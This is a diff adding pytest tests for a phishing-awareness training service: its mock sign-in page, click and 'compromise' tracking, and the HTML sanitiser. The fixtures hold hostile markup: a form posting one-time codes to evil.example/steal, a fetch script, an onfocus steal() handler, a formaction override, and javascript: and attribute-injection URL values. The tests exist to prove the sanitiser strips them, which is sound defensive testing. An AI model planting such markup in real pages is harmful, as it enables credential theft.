@@ -191,3 +191,139 @@ def test_the_served_page_is_personalised(mod, monkeypatch):
     monkeypatch.setattr(mod, "landing_pages_table", _Table({"LP-001": page}, "LandingPageID"))
     resp = mod.lambda_handler({"pathParameters": {"trackingToken": "tok"}}, SimpleNamespace(aws_request_id="t"))
     assert "<h1>Oops Ravi</h1>" in resp["body"]
+
+
+# --- the browser page (stage 2) and the compromise --------------------------
+
+BROWSER = (
+    '<div class="vshield-canvas-item" data-type="card">'
+    '<h3>Sign in to @UserName</h3>'
+    '<input type="text" name="user" value="{{email}}">'
+    '<input type="password" name="pass" form="elsewhere" onfocus="steal()">'
+    '<form action="https://evil.example/steal" method="post"><textarea name="otp"></textarea></form>'
+    '<script>fetch("https://evil.example")</script>'
+    '<div class="vshield-canvas-item" data-action="training">'
+    '<a href="{{compromiseLink}}" onclick="return false;" style="display:block;background:#0078D4;color:#fff">Sign in</a>'
+    '</div></div>'
+)
+
+
+def _track(mod, monkeypatch, campaign, event_extra=None, pages=None):
+    recipients = _Table({"r": {"campaignId": "CMP-1", "recipientId": "R-1", "recipientEmail": "ana@x.example"}})
+    events = _Table()
+    monkeypatch.setattr(mod, "recipients_table", recipients)
+    monkeypatch.setattr(mod, "events_table", events)
+    monkeypatch.setattr(mod, "campaigns_table", _Table({"CMP-1": campaign}, "campaignId"))
+    monkeypatch.setattr(mod, "landing_pages_table", _Table(pages or {}, "LandingPageID"))
+    event = {"pathParameters": {"trackingToken": "tok"}, **(event_extra or {})}
+    return mod.lambda_handler(event, SimpleNamespace(aws_request_id="t")), events, recipients
+
+
+BROWSER_LINK = {"queryStringParameters": {"next": "browser"}}
+COMPROMISE = {
+    "routeKey": "POST /track/{trackingToken}/compromise",
+    "requestContext": {"http": {"method": "POST"}},
+    "body": "user=ana%40x.example&pass=hunter2",
+}
+
+
+def test_the_browser_link_records_a_click_and_shows_the_browser_page(mod, monkeypatch):
+    resp, events, recipients = _track(mod, monkeypatch, {"browserPageHtml": BROWSER, "landingPageId": "LP-001"}, BROWSER_LINK)
+    body = resp["body"]
+    assert resp["statusCode"] == 200 and "Sign in to " in body
+    assert events.puts[0]["eventType"] == "CLICK" and events.puts[0]["stage"] == "BROWSER_PAGE"
+    assert "clickedAt" in recipients.updates[0]["UpdateExpression"]
+    assert '<form method="post" action="tok/compromise"' in body
+    assert "form-action 'self'" in resp["headers"]["Content-Security-Policy"]
+    assert 'value="ana@x.example"' in body  # personalised
+
+
+def test_the_browser_page_can_send_nothing_typed(mod, monkeypatch):
+    body = _track(mod, monkeypatch, {"browserPageHtml": BROWSER}, BROWSER_LINK)[0]["body"]
+    body = body[body.index("<body>"):]
+    assert "name=" not in body and 'form="' not in body
+    assert "<script" not in body and "evil.example" not in body
+    assert "onclick" not in body and "onfocus" not in body
+    assert body.count("<form") == 1  # only the page's own
+    # the link became a submit button that keeps its look
+    assert '<button type="submit" class="vshield-canvas-item"' not in body
+    assert '<button type="submit" style="border:none;' in body and "background:#0078D4" in body
+    assert "<a " not in body
+    assert "width:100%;display:block" in body  # a block link still fills its row
+    assert "contenteditable" not in _track(mod, monkeypatch, {"browserPageHtml": '<p contenteditable="true" style="cursor: move">Hi</p>'}, BROWSER_LINK)[0]["body"]
+
+
+def test_a_field_name_cannot_slip_past_the_cleaning(mod):
+    """Any separator before `name` (a slash, a tab, a newline, upper case) is
+    still removed, and a value that merely contains "/name=" is left alone."""
+    clean = mod.browser_page_content
+    for tag in (
+        '<input type="text"/name="pw">',
+        '<input\tname="pw">',
+        "<input\nNAME='pw'>",
+        '<INPUT type=password/ name=pw>',
+        '<button/formaction="https://evil.example">Go</button>',
+        '<textarea form="f" name="x"></textarea>',
+        '<select/name=x></select>',
+    ):
+        out = clean(tag)
+        assert "name=" not in out.lower() and "formaction" not in out.lower() and "form=" not in out.lower(), (tag, out)
+    assert 'data-x="http://a/name=1"' in clean('<input data-x="http://a/name=1" name="n">')
+    assert clean('<input type="password" name="pw">') == '<input type="password">'
+
+
+def test_no_browser_page_means_the_landing_page(mod, monkeypatch):
+    resp, events, _ = _track(mod, monkeypatch, {"landingPageId": "LP-001"}, BROWSER_LINK, {"LP-001": {"LandingPageContent": LP}})
+    assert "Oops! You have been phished" in resp["body"]
+    assert "form-action 'none'" in resp["headers"]["Content-Security-Policy"]
+    assert events.puts[0]["eventType"] == "CLICK"
+
+
+def test_a_plain_link_still_shows_the_landing_page_when_a_browser_page_exists(mod, monkeypatch):
+    resp, events, _ = _track(mod, monkeypatch, {"browserPageHtml": BROWSER, "landingPageId": "LP-001"}, None, {"LP-001": {"LandingPageContent": LP}})
+    assert "Oops! You have been phished" in resp["body"] and events.puts[0]["stage"] == "LANDING_PAGE"
+
+
+def test_submitting_the_browser_page_marks_compromised_and_shows_the_landing_page(mod, monkeypatch, capsys):
+    resp, events, recipients = _track(mod, monkeypatch, {"browserPageHtml": BROWSER, "landingPageId": "LP-001"}, COMPROMISE, {"LP-001": {"LandingPageContent": LP}})
+    assert resp["statusCode"] == 200 and "Oops! You have been phished" in resp["body"]
+    (event,) = events.puts
+    assert event["eventType"] == "COMPROMISE" and event["eventSource"] == "BROWSER_PAGE"
+    update = recipients.updates[0]
+    assert "compromisedAt = if_not_exists(compromisedAt" in update["UpdateExpression"]
+    assert "clickedAt = if_not_exists(clickedAt" in update["UpdateExpression"]
+    # nothing that was typed is stored or logged
+    stored = json.dumps([events.puts, recipients.updates]) + capsys.readouterr().out
+    assert "hunter2" not in stored and "ana%40" not in stored
+
+
+def test_a_compromise_with_a_bad_token_is_404(mod, monkeypatch):
+    monkeypatch.setattr(mod, "recipients_table", _Table({}))
+    events = _Table()
+    monkeypatch.setattr(mod, "events_table", events)
+    resp = mod.lambda_handler({"pathParameters": {"trackingToken": "nope"}, **COMPROMISE}, SimpleNamespace(aws_request_id="t"))
+    assert resp["statusCode"] == 404 and events.puts == []
+
+
+def test_the_landing_pages_training_link_leaves_the_api_domain(mod, monkeypatch):
+    page = {"LandingPageContent": '<a href="/my-training" target="_top">Start training</a>'}
+    campaign = {"landingPageId": "LP-001", "appBaseUrl": "https://app.example.com/"}
+    resp, _, _ = _track(mod, monkeypatch, campaign, None, {"LP-001": page})
+    assert 'href="https://app.example.com/my-training"' in resp["body"]
+
+
+def test_the_standard_page_links_training_only_to_a_plain_origin(mod, monkeypatch):
+    resp, _, _ = _track(mod, monkeypatch, {"appBaseUrl": "https://app.example.com"})
+    assert 'href="https://app.example.com/my-training"' in resp["body"]
+    for bad in ("javascript:alert(1)", "https://x.example/path", "https://x.example\" onmouseover=\"y"):
+        resp, _, _ = _track(mod, monkeypatch, {"appBaseUrl": bad})
+        assert "<a class=\"training-button\"" not in resp["body"]
+        assert "Your security training has been assigned" in resp["body"]
+
+
+def test_app_base_url_env_wins(mod, monkeypatch):
+    monkeypatch.setattr(mod, "APP_BASE_URL", "https://vshield.example.com")
+    assert mod.training_url({"appBaseUrl": "http://localhost:5173"}) == "https://vshield.example.com/my-training"
+    monkeypatch.setattr(mod, "APP_BASE_URL", "")
+    assert mod.training_url({"appBaseUrl": "http://localhost:5173"}) == "http://localhost:5173/my-training"
+    assert mod.training_url(None) is None
